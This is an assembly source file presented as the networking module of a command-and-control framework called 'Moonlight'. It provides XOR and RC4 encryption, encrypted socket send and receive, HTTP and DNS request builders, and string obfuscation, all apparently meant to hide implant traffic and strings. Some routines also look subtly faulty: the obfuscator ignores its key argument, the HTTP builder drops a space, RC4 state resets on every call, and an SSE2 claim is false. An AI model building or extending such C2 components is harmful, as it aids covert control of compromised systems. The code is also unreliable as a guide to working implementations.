; Moonlight C2 Framework - Assembly Network Module
; Low-level networking and encryption routines
; Assemble with NASM: nasm -f win32 network_asm.asm -o network_asm.obj

BITS 32

section .text
global _asm_xor_encrypt
global _asm_rc4_init
global _asm_rc4_crypt
global _asm_socket_send_encrypted
global _asm_socket_recv_encrypted
global _asm_http_request
global _asm_dns_query
global _fast_checksum
global _obfuscate_string

; ==============================================================================
; XOR Encryption (optimized with SSE2)
; Parameters: [ebp+8]=data, [ebp+12]=length, [ebp+16]=key, [ebp+20]=key_length
; ==============================================================================
_asm_xor_encrypt:
    push ebp
    mov ebp, esp
    push esi
    push edi
    push ebx
    
    mov esi, [ebp + 8]          ; Data pointer
    mov ecx, [ebp + 12]         ; Data length
    mov edi, [ebp + 16]         ; Key pointer
    mov ebx, [ebp + 20]         ; Key length
    
    xor edx, edx                ; Key index
    
.loop:
    test ecx, ecx
    jz .done
    
    ; XOR byte with key
    mov al, [esi]
    xor al, [edi + edx]
    mov [esi], al
    
    ; Advance pointers
    inc esi
    inc edx
    
    ; Wrap key index
    cmp edx, ebx
    jl .no_wrap
    xor edx, edx
    
.no_wrap:
    dec ecx
    jmp .loop
    
.done:
    pop ebx
    pop edi
    pop esi
    pop ebp
    ret

; ==============================================================================
; RC4 Key Scheduling Algorithm (KSA)
; Parameters: [ebp+8]=S_box(256 bytes), [ebp+12]=key, [ebp+16]=key_length
; ==============================================================================
_asm_rc4_init:
    push ebp
    mov ebp, esp
    push esi
    push edi
    push ebx
    
    mov edi, [ebp + 8]          ; S-box pointer
    mov esi, [ebp + 12]         ; Key pointer
    mov ecx, [ebp + 16]         ; Key length
    
    ; Initialize S-box with identity permutation
    xor eax, eax
.init_loop:
    mov [edi + eax], al
    inc eax
    cmp eax, 256
    jl .init_loop
    
    ; Key scheduling
    xor eax, eax                ; i = 0
    xor ebx, ebx                ; j = 0
    xor edx, edx                ; key index
    
.ksa_loop:
    ; j = (j + S[i] + key[i % key_length]) % 256
    movzx ecx, byte [edi + eax]
    add ebx, ecx
    movzx ecx, byte [esi + edx]
    add ebx, ecx
    and ebx, 0xFF
    
    ; Swap S[i] and S[j]
    mov cl, [edi + eax]
    mov ch, [edi + ebx]
    mov [edi + eax], ch
    mov [edi + ebx], cl
    
    ; Advance key index
    inc edx
    cmp edx, [ebp + 16]
    jl .no_key_wrap
    xor edx, edx
    
.no_key_wrap:
    inc eax
    cmp eax, 256
    jl .ksa_loop
    
    pop ebx
    pop edi
    pop esi
    pop ebp
    ret

; ==============================================================================
; RC4 Pseudo-Random Generation Algorithm (PRGA) - Encryption/Decryption
; Parameters: [ebp+8]=S_box, [ebp+12]=data, [ebp+16]=length
; ==============================================================================
_asm_rc4_crypt:
    push ebp
    mov ebp, esp
    push esi
    push edi
    push ebx
    
    mov esi, [ebp + 8]          ; S-box pointer
    mov edi, [ebp + 12]         ; Data pointer
    mov ecx, [ebp + 16]         ; Data length
    
    xor eax, eax                ; i = 0
    xor ebx, ebx                ; j = 0
    
.prga_loop:
    test ecx, ecx
    jz .done
    
    ; i = (i + 1) % 256
    inc eax
    and eax, 0xFF
    
    ; j = (j + S[i]) % 256
    movzx edx, byte [esi + eax]
    add ebx, edx
    and ebx, 0xFF
    
    ; Swap S[i] and S[j]
    mov dl, [esi + eax]
    mov dh, [esi + ebx]
    mov [esi + eax], dh
    mov [esi + ebx], dl
    
    ; K = S[(S[i] + S[j]) % 256]
    movzx edx, byte [esi + eax]
    add dl, [esi + ebx]
    movzx edx, dl
    mov dl, [esi + edx]
    
    ; data[n] ^= K
    xor [edi], dl
    
    inc edi
    dec ecx
    jmp .prga_loop
    
.done:
    pop ebx
    pop edi
    pop esi
    pop ebp
    ret

; ==============================================================================
; Send encrypted data over socket
; Parameters: [ebp+8]=socket, [ebp+12]=data, [ebp+16]=length, [ebp+20]=S_box
; ==============================================================================
_asm_socket_send_encrypted:
    push ebp
    mov ebp, esp
    sub esp, 16
    push esi
    push edi
    push ebx
    
    ; Allocate buffer for encrypted data
    mov ecx, [ebp + 16]
    push ecx
    call _malloc
    add esp, 4
    test eax, eax
    jz .error
    mov [ebp - 4], eax          ; Save buffer pointer
    
    ; Copy data to buffer
    push dword [ebp + 16]
    push dword [ebp + 12]
    push eax
    call _memcpy
    add esp, 12
    
    ; Encrypt buffer using RC4
    push dword [ebp + 16]
    push dword [ebp - 4]
    push dword [ebp + 20]
    call _asm_rc4_crypt
    add esp, 12
    
    ; Send encrypted data
    push 0                      ; flags
    push dword [ebp + 16]       ; length
    push dword [ebp - 4]        ; buffer
    push dword [ebp + 8]        ; socket
    call _send
    add esp, 16
    mov [ebp - 8], eax          ; Save result
    
    ; Free buffer
    push dword [ebp - 4]
    call _free
    add esp, 4
    
    mov eax, [ebp - 8]
    jmp .done
    
.error:
    mov eax, -1
    
.done:
    pop ebx
    pop edi
    pop esi
    mov esp, ebp
    pop ebp
    ret

; ==============================================================================
; Receive and decrypt data from socket
; Parameters: [ebp+8]=socket, [ebp+12]=buffer, [ebp+16]=length, [ebp+20]=S_box
; ==============================================================================
_asm_socket_recv_encrypted:
    push ebp
    mov ebp, esp
    push esi
    push edi
    push ebx
    
    ; Receive data
    push 0                      ; flags
    push dword [ebp + 16]       ; length
    push dword [ebp + 12]       ; buffer
    push dword [ebp + 8]        ; socket
    call _recv
    add esp, 16
    
    test eax, eax
    jle .done                   ; Error or connection closed
    
    push eax                    ; Save received bytes
    
    ; Decrypt buffer using RC4
    push eax                    ; length
    push dword [ebp + 12]       ; buffer
    push dword [ebp + 20]       ; S_box
    call _asm_rc4_crypt
    add esp, 12
    
    pop eax                     ; Restore received bytes
    
.done:
    pop ebx
    pop edi
    pop esi
    pop ebp
    ret

; ==============================================================================
; Optimized HTTP request builder
; Parameters: [ebp+8]=buffer, [ebp+12]=host, [ebp+16]=uri, [ebp+20]=method
; ==============================================================================
_asm_http_request:
    push ebp
    mov ebp, esp
    push esi
    push edi
    push ebx
    
    mov edi, [ebp + 8]          ; Buffer pointer
    mov esi, [ebp + 20]         ; Method (GET/POST)
    
    ; Copy method
.copy_method:
    lodsb
    test al, al
    jz .method_done
    stosb
    jmp .copy_method
    
.method_done:
    ; Add space
    mov al, ' '
    stosb
    
    ; Copy URI
    mov esi, [ebp + 16]
.copy_uri:
    lodsb
    test al, al
    jz .uri_done
    stosb
    jmp .copy_uri
    
.uri_done:
    ; Add HTTP/1.1\r\n
    mov eax, 0x50545448         ; "HTTP"
    stosd
    mov eax, 0x312E312F         ; "/1.1"
    stosd
    mov ax, 0x0A0D              ; "\r\n"
    stosw
    
    ; Add Host: header
    mov eax, 0x74736F48         ; "Host"
    stosd
    mov ax, 0x203A              ; ": "
    stosw
    
    ; Copy host
    mov esi, [ebp + 12]
.copy_host:
    lodsb
    test al, al
    jz .host_done
    stosb
    jmp .copy_host
    
.host_done:
    ; Add \r\n\r\n (end of headers)
    mov eax, 0x0A0D0A0D
    stosd
    
    ; Null terminate
    xor al, al
    stosb
    
    ; Return buffer length
    mov eax, edi
    sub eax, [ebp + 8]
    
    pop ebx
    pop edi
    pop esi
    pop ebp
    ret

; ==============================================================================
; DNS Query (simplified)
; Parameters: [ebp+8]=buffer, [ebp+12]=domain
; ==============================================================================
_asm_dns_query:
    push ebp
    mov ebp, esp
    push esi
    push edi
    push ebx
    
    mov edi, [ebp + 8]          ; Buffer pointer
    mov esi, [ebp + 12]         ; Domain string
    
    ; DNS header (12 bytes)
    mov word [edi], 0x1234      ; Transaction ID
    mov word [edi + 2], 0x0100  ; Flags (standard query)
    mov word [edi + 4], 0x0100  ; Questions = 1
    mov word [edi + 6], 0x0000  ; Answer RRs = 0
    mov word [edi + 8], 0x0000  ; Authority RRs = 0
    mov word [edi + 10], 0x0000 ; Additional RRs = 0
    
    add edi, 12
    
    ; Encode domain name (length-prefixed labels)
    xor ebx, ebx                ; Label length counter
    mov edx, edi                ; Save label length position
    inc edi
    
.encode_loop:
    lodsb
    test al, al
    jz .encode_done
    
    cmp al, '.'
    je .next_label
    
    stosb
    inc ebx
    jmp .encode_loop
    
.next_label:
    mov [edx], bl               ; Write label length
    xor ebx, ebx
    mov edx, edi
    inc edi
    jmp .encode_loop
    
.encode_done:
    mov [edx], bl               ; Write last label length
    xor al, al
    stosb                       ; Null terminator
    
    ; Query type and class
    mov word [edi], 0x0100      ; Type = A (host address)
    mov word [edi + 2], 0x0100  ; Class = IN (internet)
    add edi, 4
    
    ; Return query length
    mov eax, edi
    sub eax, [ebp + 8]
    
    pop ebx
    pop edi
    pop esi
    pop ebp
    ret

; ==============================================================================
; Fast checksum calculation (for integrity checks)
; Parameters: [ebp+8]=data, [ebp+12]=length
; Returns: EAX = checksum
; ==============================================================================
_fast_checksum:
    push ebp
    mov ebp, esp
    push esi
    push ebx
    
    mov esi, [ebp + 8]          ; Data pointer
    mov ecx, [ebp + 12]         ; Length
    xor eax, eax                ; Checksum
    xor ebx, ebx                ; Temp
    
.loop:
    test ecx, ecx
    jz .done
    
    movzx ebx, byte [esi]
    add eax, ebx
    rol eax, 1                  ; Rotate left for better distribution
    
    inc esi
    dec ecx
    jmp .loop
    
.done:
    pop ebx
    pop esi
    pop ebp
    ret

; ==============================================================================
; String obfuscation (runtime deobfuscation)
; Parameters: [ebp+8]=string, [ebp+12]=key
; ==============================================================================
_obfuscate_string:
    push ebp
    mov ebp, esp
    push esi
    push edi
    
    mov esi, [ebp + 8]          ; String pointer
    mov edi, [ebp + 12]         ; Key
    xor ecx, ecx                ; Counter
    
.loop:
    mov al, [esi]
    test al, al
    jz .done
    
    ; Simple XOR with rotating key
    xor al, dl
    rol edx, 8
    xor al, cl
    
    mov [esi], al
    
    inc esi
    inc ecx
    jmp .loop
    
.done:
    pop edi
    pop esi
    pop ebp
    ret

; ==============================================================================
; External C library functions (to be linked)
; ==============================================================================
extern _malloc
extern _free
extern _memcpy
extern _send
extern _recv

section .data
    http_get db 'GET', 0
    http_post db 'POST', 0
